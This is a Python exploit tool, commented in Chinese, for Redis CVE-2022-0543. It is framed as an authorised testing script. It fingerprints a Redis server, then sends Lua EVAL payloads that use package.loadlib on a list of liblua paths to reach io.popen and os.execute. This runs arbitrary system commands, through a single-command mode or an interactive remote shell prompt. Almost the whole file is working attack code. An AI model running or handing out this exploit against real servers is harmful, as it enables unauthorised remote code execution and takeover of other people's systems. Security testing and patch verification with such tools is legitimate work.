#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Redis CVE-2022-0543 - Lua 沙箱逃逸 RCE 测试脚本
仅用于授权安全测试

CVE-2022-0543: 在 Debian/Ubuntu 打包的 Redis 中，Lua 库被编译时
误启用了 package.loadlib，导致攻击者可通过 EVAL 加载系统库执行命令。
受影响: Debian/Ubuntu 下 redis-server 包 (非官方编译不受影响)
"""

import socket
import sys
import argparse
import re
from typing import Optional, Tuple, List

# ---------- 颜色 ----------

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'


def safe_print(*args, **kwargs):
    """绕过 Windows GBK 编码问题的 print"""
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for arg in args:
            try:
                print(arg, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(arg).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def print_banner():
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║     Redis CVE-2022-0543 - Lua 沙箱逃逸 RCE 测试工具         ║
║     仅限授权安全使用                                        ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)


# ---------- Redis 原始协议通信 ----------

class RedisClient:
    """轻量 Redis 客户端 (避免依赖 redis-py)"""

    def __init__(self, host: str, port: int, password: Optional[str] = None, timeout: int = 10):
        self.host = host
        self.port = port
        self.password = password
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._buf = b""

    def _recv_line(self) -> str:
        while b"\n" not in self._buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("连接已关闭")
            self._buf += chunk
        line, self._buf = self._buf.split(b"\n", 1)
        return line.decode("utf-8", errors="replace").rstrip("\r")

    def _recv_bulk(self, length: int) -> bytes:
        while len(self._buf) < length + 2:  # +2 for \r\n
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("连接已关闭")
            self._buf += chunk
        data = self._buf[:length]
        self._buf = self._buf[length + 2:]  # skip \r\n
        return data

    def _send(self, *args) -> None:
        """构造并发送 RESP 协议命令"""
        parts = []
        parts.append(f"*{len(args)}\r\n")
        for arg in args:
            arg_str = str(arg)
            parts.append(f"${len(arg_str.encode('utf-8'))}\r\n{arg_str}\r\n")
        self.sock.sendall("".join(parts).encode("utf-8"))

    def _read_response(self):
        """读取 RESP 响应"""
        line = self._recv_line()
        if not line:
            return None
        prefix = line[0]
        if prefix == "+":
            return line[1:]
        elif prefix == "-":
            return Exception(line[1:])
        elif prefix == ":":
            return int(line[1:])
        elif prefix == "$":
            length = int(line[1:])
            if length == -1:
                return None
            return self._recv_bulk(length)
        elif prefix == "*":
            count = int(line[1:])
            if count == -1:
                return None
            return [self._read_response() for _ in range(count)]
        return line

    def execute(self, *args) -> object:
        """执行 Redis 命令并返回响应"""
        self._send(*args)
        return self._read_response()

    def connect(self) -> bool:
        """建立连接并认证"""
        try:
            self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            # 若需要密码，先 AUTH
            if self.password:
                resp = self.execute("AUTH", self.password)
                if isinstance(resp, Exception):
                    print(f"{Colors.RED}[-] 认证失败: {resp}{Colors.RESET}")
                    return False
                print(f"{Colors.GREEN}[+] 认证成功{Colors.RESET}")

            return True
        except socket.timeout:
            print(f"{Colors.RED}[-] 连接超时{Colors.RESET}")
            return False
        except ConnectionRefusedError:
            print(f"{Colors.RED}[-] 连接被拒绝{Colors.RESET}")
            return False
        except Exception as e:
            print(f"{Colors.RED}[-] 连接失败: {e}{Colors.RESET}")
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


# ---------- 版本 / 漏洞检测 ----------

def get_redis_info(client: RedisClient) -> Optional[dict]:
    """执行 INFO server 获取 Redis 版本和 OS 信息"""
    resp = client.execute("INFO", "server")
    if isinstance(resp, bytes):
        resp = resp.decode("utf-8", errors="replace")
    if isinstance(resp, Exception) or not isinstance(resp, str):
        print(f"{Colors.YELLOW}[!] 无法获取 INFO 信息{Colors.RESET}")
        return None

    info = {}
    for line in resp.split("\n"):
        if ":" in line and not line.startswith("#"):
            key, val = line.split(":", 1)
            info[key.strip()] = val.strip()
    return info


def check_vulnerable_by_info(info: dict) -> Optional[bool]:
    """
    根据 INFO 信息判断是否可能受影响。
    关键指标：
      - os 字段包含 "Linux"（Debian/Ubuntu）
      - redis_mode 为 "standalone"（非 cluster/sentinel）
      - redis_version 通常 < 6.2.7 或 < 7.0.0 (取决于发行版修复时间)
    """
    os_info = info.get("os", "")
    version = info.get("redis_version", "")
    mode = info.get("redis_mode", "standalone")

    if "linux" not in os_info.lower():
        print(f"{Colors.YELLOW}[!] 目标 OS 非 Linux ({os_info})，CVE-2022-0543 主要影响 Debian/Ubuntu 打包{Colors.RESET}")
        return None

    if mode != "standalone":
        print(f"{Colors.YELLOW}[!] Redis 运行模式为 {mode}，非 standalone{Colors.RESET}")

    # 检查是否是 Debian/Ubuntu 构建
    build_id = info.get("redis_build_id", "")
    is_deb = any(kw in build_id.lower() for kw in ["debian", "ubuntu", "deb", "apt"])
    if not is_deb:
        print(f"{Colors.YELLOW}[!] 未检测到 Debian/Ubuntu 构建标识 (build_id: {build_id}){Colors.RESET}")
        print(f"{Colors.YELLOW}[!] 非 Debian/Ubuntu 打包版本通常不受影响，但仍将尝试{Colors.RESET}")

    return None  # 不绝对判断，始终尝试利用


# ---------- Payload 构造 ----------

# 常见系统上 liblua 的可能路径
LUA_LIB_PATHS = [
    # Debian/Ubuntu x86_64
    "/usr/lib/x86_64-linux-gnu/liblua5.1.so.0",
    "/usr/lib/x86_64-linux-gnu/liblua5.1.so",
    # Debian/Ubuntu i386
    "/usr/lib/i386-linux-gnu/liblua5.1.so.0",
    "/usr/lib/i386-linux-gnu/liblua5.1.so",
    # Debian/Ubuntu arm64
    "/usr/lib/aarch64-linux-gnu/liblua5.1.so.0",
    "/usr/lib/aarch64-linux-gnu/liblua5.1.so",
    # Debian/Ubuntu armhf
    "/usr/lib/arm-linux-gnueabihf/liblua5.1.so.0",
    "/usr/lib/arm-linux-gnueabihf/liblua5.1.so",
    # 其他可能路径
    "/usr/lib/liblua5.1.so.0",
    "/usr/lib/liblua5.1.so",
    "/usr/lib64/liblua5.1.so.0",
    "/usr/lib64/liblua5.1.so",
    "/usr/local/lib/liblua5.1.so",
]


def build_lua_payloads(command: str) -> List[Tuple[str, str]]:
    """
    构造多套 Lua 沙箱逃逸 payload。
    返回 (描述, lua_script) 列表。
    """

    # luaopen_io 返回 io 库 → io.popen 执行命令
    io_pop_prefix = (
        "local io_l = package.loadlib('{lib}', 'luaopen_io'); "
        "local io = io_l(); "
        "local f = io.popen('{cmd}', 'r'); "
        "local res = f:read('*a'); f:close(); "
        "return res"
    )
    # luaopen_os 返回 os 库 → os.execute (只能获取退出码, 用临时文件读取)
    os_exec_prefix = (
        "local os_l = package.loadlib('{lib}', 'luaopen_os'); "
        "local os = os_l(); "
        "local tmp = '/tmp/.redis_rce_' .. math.random(100000); "
        "os.execute('{cmd} > ' .. tmp); "
        "local f = io.open(tmp, 'r'); "
        "local res = f:read('*a') or ''; f:close(); os.remove(tmp); "
        "return res"
    )

    payloads = []

    for lib_path in LUA_LIB_PATHS:
        # 方式 1: 通过 io.popen 执行 (推荐)
        payloads.append((
            f"io.popen ← {lib_path}",
            io_pop_prefix.format(lib=lib_path, cmd=command),
        ))
        # 方式 2: 通过 os.execute + 临时文件
        payloads.append((
            f"os.execute ← {lib_path}",
            os_exec_prefix.format(lib=lib_path, cmd=command),
        ))

    return payloads


# ---------- 核心利用 ----------

def execute_command(
    client: RedisClient,
    command: str,
) -> Tuple[bool, str]:
    """
    通过 EVAL 执行 Lua 沙箱逃逸 payload，运行系统命令。
    """
    payloads = build_lua_payloads(command)
    tried_paths = set()

    for desc, lua_script in payloads:
        # 提取库路径用于去重显示
        lib_path = desc.split(" ← ")[-1]
        if lib_path in tried_paths:
            continue
        # 只对每个唯一库路径显示一次尝试
        if lib_path not in [p.split(" ← ")[-1] for p, _ in payloads if p.startswith("io.popen")]:
            pass

        try:
            resp = client.execute("EVAL", lua_script, "0")
        except ConnectionError as e:
            print(f"{Colors.RED}[-] 连接断开: {e}{Colors.RESET}")
            return False, ""
        except Exception as e:
            print(f"{Colors.RED}[-] 执行异常: {e}{Colors.RESET}")
            continue

        if isinstance(resp, Exception):
            err_msg = str(resp)
            # package.loadlib 未启用
            if "loadlib" in err_msg.lower() or "package" in err_msg.lower():
                print(f"{Colors.YELLOW}[!] {desc}: package.loadlib 不可用{Colors.RESET}")
                tried_paths.add(lib_path)
                continue
            # 库文件不存在
            if any(kw in err_msg.lower() for kw in ["could not open", "not found", "no such file", "cannot open"]):
                if lib_path not in tried_paths:
                    print(f"{Colors.YELLOW}[!] 库不存在: {lib_path}{Colors.RESET}")
                    tried_paths.add(lib_path)
                continue
            # 其他错误
            print(f"{Colors.YELLOW}[!] {desc}: {err_msg[:120]}{Colors.RESET}")
            continue

        # 成功 — EVAL 返回了命令输出
        if isinstance(resp, bytes):
            output = resp.decode("utf-8", errors="replace").strip()
        elif isinstance(resp, str):
            output = resp.strip()
        else:
            output = str(resp)

        if output:
            print(f"{Colors.GREEN}[+] 利用成功 — {desc}{Colors.RESET}")
            return True, output
        else:
            # 命令执行了但无输出 (如 touch / mkdir 等)
            # 如果没报错且返回了空字符串，也算成功
            print(f"{Colors.GREEN}[+] 利用成功 (空输出) — {desc}{Colors.RESET}")
            return True, "(命令执行成功，无输出)"

    return False, ""


# ---------- 交互式 Shell ----------

def interactive_shell(client: RedisClient):
    """交互式命令执行"""
    print(f"\n{Colors.GREEN}[+] 进入交互模式 (输入 'exit' 退出, 'clear' 清屏){Colors.RESET}")

    # 连通性测试
    success, output = execute_command(client, "id")
    if success:
        print(f"{Colors.GREEN}[+] 漏洞利用成功！当前身份:{Colors.RESET}")
        safe_print(f"    {output}")
    else:
        print(f"{Colors.RED}[-] 连通性测试失败，可能无法利用{Colors.RESET}")
        return

    while True:
        try:
            cmd = input(f"\n{Colors.RED}Redis-RCE>{Colors.RESET} ").strip()
            if cmd.lower() == 'exit' or cmd.lower() == 'quit':
                print("退出")
                break
            if cmd.lower() == 'clear':
                print("\033[2J\033[H", end="")
                continue
            if not cmd:
                continue

            success, output = execute_command(client, cmd)
            if success:
                safe_print(output if output else "(无输出)")
            else:
                print(f"{Colors.RED}[-] 命令执行失败{Colors.RESET}")
        except KeyboardInterrupt:
            print("\n退出")
            break
        except EOFError:
            break


# ---------- 主入口 ----------

def main():
    parser = argparse.ArgumentParser(description='Redis CVE-2022-0543 Lua 沙箱逃逸 RCE 测试工具')
    parser.add_argument('-H', '--host', default='127.0.0.1', help='Redis 主机 (默认: 127.0.0.1)')
    parser.add_argument('-p', '--port', type=int, default=6379, help='Redis 端口 (默认: 6379)')
    parser.add_argument('-a', '--auth', help='Redis 认证密码')
    parser.add_argument('-c', '--cmd', help='执行单条命令后退出')
    parser.add_argument('-i', '--interactive', action='store_true', help='进入交互式 shell')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='连接超时秒数 (默认: 10)')
    parser.add_argument('--check-only', action='store_true', help='仅检测漏洞是否存在，不执行命令')
    args = parser.parse_args()

    print_banner()

    # 连接
    client = RedisClient(args.host, args.port, args.auth, args.timeout)
    if not client.connect():
        sys.exit(1)

    print(f"{Colors.CYAN}[*] 目标: {args.host}:{args.port}{Colors.RESET}")

    try:
        # 获取 INFO
        info = get_redis_info(client)
        if info:
            version = info.get("redis_version", "unknown")
            os_info = info.get("os", "unknown")
            build_id = info.get("redis_build_id", "unknown")
            print(f"{Colors.CYAN}[*] Redis 版本: {version}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] 操作系统:   {os_info}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] 构建 ID:    {build_id}{Colors.RESET}")
            check_vulnerable_by_info(info)

        # 测试漏洞
        print(f"\n{Colors.YELLOW}[*] 正在测试 Lua 沙箱逃逸...{Colors.RESET}\n")

        if args.check_only:
            # 仅检测模式 — 执行无害的 echo 测试
            success, output = execute_command(client, "echo CVE-2022-0543-TEST")
            if success and "CVE-2022-0543-TEST" in output:
                print(f"{Colors.RED}[!] 漏洞存在 — CVE-2022-0543 已验证{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}[+] 未发现漏洞 (或库路径不匹配){Colors.RESET}")
            return

        if args.cmd:
            print(f"{Colors.YELLOW}[*] 执行命令: {args.cmd}{Colors.RESET}")
            success, output = execute_command(client, args.cmd)
            if success:
                print(f"{Colors.GREEN}[+] 命令执行成功{Colors.RESET}")
                safe_print(f"{'=' * 50}\n{output}\n{'=' * 50}")
            else:
                print(f"{Colors.RED}[-] 命令执行失败{Colors.RESET}")
        elif args.interactive:
            interactive_shell(client)
        else:
            # 默认: 检测漏洞是否存在
            print(f"{Colors.YELLOW}[*] 默认检测模式 (执行 id 命令)...{Colors.RESET}")
            success, output = execute_command(client, "id")
            if success:
                print(f"{Colors.RED}[!] 漏洞存在 — CVE-2022-0543 已验证{Colors.RESET}")
                safe_print(f"当前身份: {output}")
            else:
                print(f"{Colors.GREEN}[+] 未发现漏洞 (或库路径不匹配){Colors.RESET}")
    finally:
        client.close()


if __name__ == "__main__":
    # 修复 Windows 终端编码
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
    main()
